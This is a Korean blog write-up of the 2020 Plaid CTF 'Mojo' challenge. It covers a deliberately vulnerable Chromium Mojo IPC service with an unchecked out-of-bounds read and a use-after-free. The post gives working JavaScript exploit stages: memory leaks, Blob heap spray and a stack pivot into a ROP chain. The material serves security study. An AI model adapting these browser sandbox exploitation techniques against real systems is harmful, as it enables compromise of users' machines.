---
layout: post
title:  "2020 Plaid CTF - Mojo"
author: "nextline"
comments: true
tags: [ctf, write-up]
---

라온화이트햇 핵심연구팀 이영주

# 1. Vulnerability

```diff
--- /dev/null
+++ b/content/browser/plaidstore/plaidstore_impl.h
@@ -0,0 +1,35 @@
+#include <string>
+#include <vector>
+
+#include "third_party/blink/public/mojom/plaidstore/plaidstore.mojom.h"
+
+namespace content {
+
+class RenderFrameHost;
+
+class PlaidStoreImpl : public blink::mojom::PlaidStore {
+ public:
+  explicit PlaidStoreImpl(RenderFrameHost *render_frame_host);
+
+  static void Create(
+      RenderFrameHost* render_frame_host,
+      mojo::PendingReceiver<blink::mojom::PlaidStore> receiver);
+
+  ~PlaidStoreImpl() override;
+
+  // PlaidStore overrides:
+  void StoreData(
+      const std::string &key,
+      const std::vector<uint8_t> &data) override;
+
+  void GetData(
+      const std::string &key,
+      uint32_t count,
+      GetDataCallback callback) override;
+
+ private:
+  RenderFrameHost* render_frame_host_;
+  std::map<std::string, std::vector<uint8_t> > data_store_;
+};
+
+} // namespace content

--- /dev/null
+++ b/content/browser/plaidstore/plaidstore_impl.cc
@@ -0,0 +1,47 @@
+#include "content/browser/plaidstore/plaidstore_impl.h"
+#include "content/public/browser/render_frame_host.h"
+#include "mojo/public/cpp/bindings/self_owned_receiver.h"
+
+namespace content {
+
+PlaidStoreImpl::PlaidStoreImpl(
+    RenderFrameHost *render_frame_host)
+    : render_frame_host_(render_frame_host) {}
+
+PlaidStoreImpl::~PlaidStoreImpl() {}
+
+void PlaidStoreImpl::StoreData(
+    const std::string &key,
+    const std::vector<uint8_t> &data) {
+  if (!render_frame_host_->IsRenderFrameLive()) {
+    return;
+  }
+  data_store_[key] = data;
+}
+
+void PlaidStoreImpl::GetData(
+    const std::string &key,
+    uint32_t count,
+    GetDataCallback callback) {
+  if (!render_frame_host_->IsRenderFrameLive()) {
+    std::move(callback).Run({});
+    return;
+  }
+  auto it = data_store_.find(key);
+  if (it == data_store_.end()) {
+    std::move(callback).Run({});
+    return;
+  }
+  std::vector<uint8_t> result(it->second.begin(), it->second.begin() + count);
+  std::move(callback).Run(result);
+}
+
+// static
+void PlaidStoreImpl::Create(
+    RenderFrameHost *render_frame_host,
+    mojo::PendingReceiver<blink::mojom::PlaidStore> receiver) {
+  mojo::MakeSelfOwnedReceiver(std::make_unique<PlaidStoreImpl>(render_frame_host),
+                              std::move(receiver));
+}
+
+} // namespace content
```

제공된 파일중 diff 파일을 보면 Mojo IPC에서 사용할 수 있는 두개의 기능이 추가된것을 확인할 수 있다.

### 첫번째 취약점

```html
<script src="/mojo/public/js/mojo_bindings.js"></script>
<script src="/third_party/blink/public/mojom/plaidstore/plaidstore.mojom.js"></script>
<script>
	let ptr = new blink.mojom.PlaidStorePtr();
  Mojo.bindInterface(blink.mojom.PlaidStore.name, mojo.makeRequest(p).handle, "context", true);
	ptr.storeData("key", [1]);
	ptr.getData();
</script>
```

기능을 사용할 때는 위와 같은 코드로 호출할 수 있다. PlaidStoreImpl::StoreData의 경우 key(std::string)와 data(std::vector<uint8_t>)를 인자로 받아 data_store_에 값을 저장하고 그 값을 PlaidStoreImpl::GetData에서 가져올 수 있는 구조이다.

```cpp
void PlaidStoreImpl::GetData(
    const std::string &key,
    uint32_t count,
    GetDataCallback callback) {
  if (!render_frame_host_->IsRenderFrameLive()) {
    std::move(callback).Run({});
    return;
  }
  auto it = data_store_.find(key);
  if (it == data_store_.end()) {
    std::move(callback).Run({});
    return;
  }
  std::vector<uint8_t> result(it->second.begin(), it->second.begin() + count);
  std::move(callback).Run(result);
}
```

첫번째 취약점은 GetData 함수에 있다. GetData 함수는 인자로 key, count를 받는데 count에 대한 범위 검사가 존재하지 않는다. 따라서 원하는 만큼 메모리를 읽어 반환할 수 있다.

![/assets/7bacb2f1-3ed4-480e-b685-34eecdee7029/f3659752-c967-4a31-85d6-02b115109455.png](/assets/7bacb2f1-3ed4-480e-b685-34eecdee7029/f3659752-c967-4a31-85d6-02b115109455.png)

data_store_에서 65(A), 66(B)이 있는 사이즈 16의 vector를 저장하고 취약점을 트리거해서 뒤에 메모리까지 읽은 모습이다.

### 두번째 취약점

```diff
--- a/content/browser/browser_interface_binders.cc
+++ b/content/browser/browser_interface_binders.cc
@@ -86,6 +86,7 @@
 #include "third_party/blink/public/mojom/payments/payment_app.mojom.h"
 #include "third_party/blink/public/mojom/permissions/permission.mojom.h"
 #include "third_party/blink/public/mojom/picture_in_picture/picture_in_picture.mojom.h"
+#include "third_party/blink/public/mojom/plaidstore/plaidstore.mojom.h"
 #include "third_party/blink/public/mojom/presentation/presentation.mojom.h"
 #include "third_party/blink/public/mojom/quota/quota_dispatcher_host.mojom.h"
 #include "third_party/blink/public/mojom/sms/sms_receiver.mojom.h"
@@ -109,6 +110,7 @@
 #include "third_party/blink/public/mojom/serial/serial.mojom.h"
 #endif
 
+
 #if defined(OS_ANDROID)
 #include "content/browser/android/date_time_chooser_android.h"
 #include "content/browser/android/text_suggestion_host_android.h"
@@ -660,6 +662,10 @@ void PopulateFrameBinders(RenderFrameHostImpl* host,
   map->Add<blink::mojom::SerialService>(base::BindRepeating(
       &RenderFrameHostImpl::BindSerialService, base::Unretained(host)));
 #endif  // !defined(OS_ANDROID)
+
+  map->Add<blink::mojom::PlaidStore>(
+      base::BindRepeating(&RenderFrameHostImpl::CreatePlaidStore,
+                          base::Unretained(host)));
 }
 
 void PopulateBinderMapWithContext(
diff --git a/content/browser/frame_host/render_frame_host_impl.cc b/content/browser/frame_host/render_frame_host_impl.cc
index e55e2d990da4..df6e6e62dbae 100644
--- a/content/browser/frame_host/render_frame_host_impl.cc
+++ b/content/browser/frame_host/render_frame_host_impl.cc
@@ -80,6 +80,7 @@
 #include "content/browser/permissions/permission_controller_impl.h"
 #include "content/browser/permissions/permission_service_context.h"
 #include "content/browser/permissions/permission_service_impl.h"
+#include "content/browser/plaidstore/plaidstore_impl.h"
 #include "content/browser/portal/portal.h"
 #include "content/browser/presentation/presentation_service_impl.h"
 #include "content/browser/push_messaging/push_messaging_manager.h"
@@ -6619,6 +6620,11 @@ void RenderFrameHostImpl::CreateInstalledAppProvider(
   InstalledAppProviderImpl::Create(this, std::move(receiver));
 }
 
+void RenderFrameHostImpl::CreatePlaidStore(
+    mojo::PendingReceiver<blink::mojom::PlaidStore> receiver) {
+  PlaidStoreImpl::Create(this, std::move(receiver));
+}
+
```

두번째 취약점은 RenderFrameHost의 lifetime때문에 발생한다. RenderFrameHost란 브라우저에서 frame을 나타낸다. 

```diff
+
+  map->Add<blink::mojom::PlaidStore>(
+      base::BindRepeating(&RenderFrameHostImpl::CreatePlaidStore,
+                          base::Unretained(host)));
```

RenderFrameHostImpl::CreatePlaidStore를 바인딩할 때, 인자인 host(content::RenderFrameHost)를 pointer(base::Unretained)로 전달한다. 

> base::Unretained() - disables the refcounting of member function receiver objects (which may not be of refcounted types) and the COMPILE_ASSERT on function arguments. Use with care, since it implies you need to make sure the lifetime of the object lasts beyond when the callback can be invoked. For the member function receiver object, it's probably better to use a base::WeakPtr instead.

이 [링크](https://www.chromium.org/developers/coding-style/important-abstractions-and-data-structures)에 따르면 base::Unretained()은 refcounting을 비활성화한 pointer를 처리할때 사용한다. 크롬에서 대부분의 객체들은 스마트 포인터에 의해 수명이 관리되는데 저 태그를 통해 인자를 전달하는 경우 refcounted 객체가 아닌 raw pointer 그대로 전달하게 된다.
따라서 PlaidStoreImpl는 RenderFrameHost 객체를 raw pointer로 가지고 있고, 서비스보다 host 객체가 더 빨리 해제된 상태에서 PlaidStoreImpl 함수들을 호출하면 use-after-free 취약점이 발생하게 된다.

```diff
+void PlaidStoreImpl::StoreData(
+    const std::string &key,
+    const std::vector<uint8_t> &data) {
+  if (!render_frame_host_->IsRenderFrameLive()) {
+    return;
+  }
...
+void PlaidStoreImpl::GetData(
+    const std::string &key,
+    uint32_t count,
+    GetDataCallback callback) {
+  if (!render_frame_host_->IsRenderFrameLive()) {
+    std::move(callback).Run({});
+    return;
+  }
```

UAF 취약점이 발생하게 되면, storeData와 getData 함수를 호출할 때 render_frame_host_가 free된 pointer이다. 그래서 `render_frame_host_->IsRenderFrameLive()` 함수를 호출할 때 크래시가 발생한다.

![/assets/0350c1e2-6822-4c6e-ae56-7aa843a72534/32e97a92-7980-40d2-809d-85883f145779.png](/assets/0350c1e2-6822-4c6e-ae56-7aa843a72534/32e97a92-7980-40d2-809d-85883f145779.png)

취약점을 트리거 하면 위와같은 모습이다. `call qword ptr [rax + 0x160]` 에서 크래시가 발생하며 rax가 이상한 값으로 덮혀있는 것을 확인할 수 있다.

# 2. Exploit

exploit은 여러가지 방법으로 시도할 수 있다. 시도한 방법은 아래와 같다.

1. memory leak 취약점을 이용해 chrome binary base를 구한다. (pie 우회)
2. 원하는 값이 있고 주소를 아는 heap 메모리를 만든다. (rop chain 구성을 위해서)
3. spray를 통해 rax를 heap 메모리로 변경한다.
4. push rax; pop rsp; ret 가젯을 통해 스택을 피벗한다.
5. flag를 읽는다.

### 1. chrome binary base 주소 구하기

```jsx
async function leak_pie() {
    ptr = new blink.mojom.PlaidStorePtr()
    Mojo.bindInterface(blink.mojom.PlaidStore.name, mojo.makeRequest(ptr).handle , 'context', true);

    var spr = [];
	  var arr = new Uint8Array(0x1);
	  arr.fill(0x47);
	  for (var i = 0; i < 0x100; i++) {
	      spr.push(new blink.mojom.PlaidStorePtr())
	      Mojo.bindInterface(blink.mojom.PlaidStore.name, mojo.makeRequest(spr[i]).handle , 'context', true);
	      spr[i].storeData('key', arr);
	  }
	  for (var i = 0; i < 0x100; i++) {
	      spr[i].ptr.reset();
	  }

    var arr = new Uint8Array(0x30);
    ptr.storeData("key", arr);
    var tmp = await ptr.getData("key", 1000000);
    var tmp2 = new Uint8Array(tmp.data);
    var tmp3 = new Uint32Array(tmp2.buffer);

    // find pie
    for (var i = 0; i < 10000; i++) {
        if ((tmp3[i] & 0x0fff) == 0x9d0) {
            pie = (tmp3[i+1] * 0x100000000) + tmp3[i] - 0x2d5f9d0;
        }
        if (pie != 0) {
            break;
        }
    }
  }
```

PlaidStoreImpl 객체 안에는 vtable처럼 chrome binary base 주소를 알아낼 수 있는 값이 존재한다. 따라서 PlaidStoreImpl를 할당받고 free한 뒤에 비슷한 크기로 chunk를 할당받아 그 위치부터 힙을 읽다 보면 환경에 상관없이 항상 binary base를 구할 수 있었다.

### 2. 원하는 값이 있는 memory 주소 구하기

```jsx
async function leak_string() {
      ptr = new blink.mojom.PlaidStorePtr()
      Mojo.bindInterface(blink.mojom.PlaidStore.name, mojo.makeRequest(ptr).handle , 'context', true);

      var spr = [];
      var arr = new Uint8Array(0x500);
      arr.fill(0x0);
      var str = "/flag_printer";
      for (var j = 0; j<str.length; j++) {
        arr[0x10+j] = str.charCodeAt(j);
      }
      for (var i = 0; i < 0x100; i++) {
          spr.push(new blink.mojom.PlaidStorePtr())
          Mojo.bindInterface(blink.mojom.PlaidStore.name, mojo.makeRequest(spr[i]).handle , 'context', true);
          spr[i].storeData('key', arr);
      }
      for (var i = 0; i < 0x100; i++) {
          spr[i].ptr.reset();
      }

      arr = new Uint8Array(0x48);
      ptr.storeData("key3", arr);
      tmp = await ptr.getData("key3", 1000000);
      tmp2 = new Uint8Array(tmp.data);
      tmp3 = new Uint32Array(tmp2.buffer);

      // find heap
      for (var i = 0; i < 100000; i++) {
          if ((tmp3[i] & 0xfff) == 0x0 && (tmp3[i] != 0)) {
              if (tmp3[i+2] == (tmp3[i] + 0x500)) {
                  stradd = tmp3[i+1] * (0x100000000) + tmp3[i];
              }
          }
          if (stradd != 0) {
              break;
          }
      }
    }
```

위 코드는 rop chain이 있는 heap 메모리를 얻어야 하는 상황처럼 알고있는 주소에 원하는 값이 있어야 할때 사용했다. PlaidStoreImpl를 할당할 때 원하는 크기에 원하는 값이 있는 uint8_t vector가 같이 할당되기 때문에 그걸 여러번 할당하고 free한 뒤 vector가 가지고 있는 특정 패턴으로 heap pointer를 찾아냈다. 이것을 통해 "/flag_printer" 문자열과 rop chain이 있는 heap memory 주소를 알아왔다.

### 3. heap spray를 통해 rax 조작하기

```jsx
function spray_blobs(size, n, c) {
    if (!c) c = 'A';
    var s = 'z_small'+blob_cnt;
    var b = new Blob([s]);
    var bary = [];
    for (var i = 0; i < n; ++i) {
        bary.push(b);
        if (c instanceof ArrayBuffer) {
            var ab = c.slice(0); // make a copy
            // w64(ab, ab.byteLength - 8, i);
            bary.push(ab);
        } else {
            var s = 'xxxxxxxx';
            s += c.repeat(size-s.length);
            bary.push(s);
        }
    }
    blob_spray.push(new Blob(bary));
    blob_cnt++;
}
```

다음으로 rax를 조작하기 위해 Blob을 이용해서 heap spray를 했다. 꼭 Blob을 사용하지 않더라도 PlaidStoreImpl에 있는 uint8_t vector로도 spray는 가능했을 것 같다.

### 4. stack 피벗 이후 rop

stack 피벗을 위해 여러 가젯들을 찾아보았는데 마침 chrome 바이너리에 `push rax; pop rsp; ret` 가젯이 있었다. 이 가젯을 통해 rax를 rsp로 변경하여 rop chain을 호출할 수 있었다.

# 3. Conclusion

mojo 문제를 풀면서 chrome ipc 구조에 꽤 많은것을 알게 되었다. 그리고 지금생각해보면 spray나 취약점을 트리거 하는 과정에서 비효율적인 코드들이 너무 많아   exploit reliability 가 낮았다고 생각한다.

실제 대회에서 이 문제를 못푼 이유가 rax 컨트롤이 거의 0.01% 확률로 성공해서 디버깅이 매우 힘들었기 때문이다. 좀 더 시간이 많았다면 다시 처음부터 코드를 작성해 효율적인 exploit을 작성할 수 있었을것 같다.

위에서 시도한 방법 말고 여러 write-up에 좋은 exploit 방법들이 많으니 추가적으로 exploit에 대해 궁금한 점이 있다면 다른 문서들을 참고해 보는게 좋을 것 같다.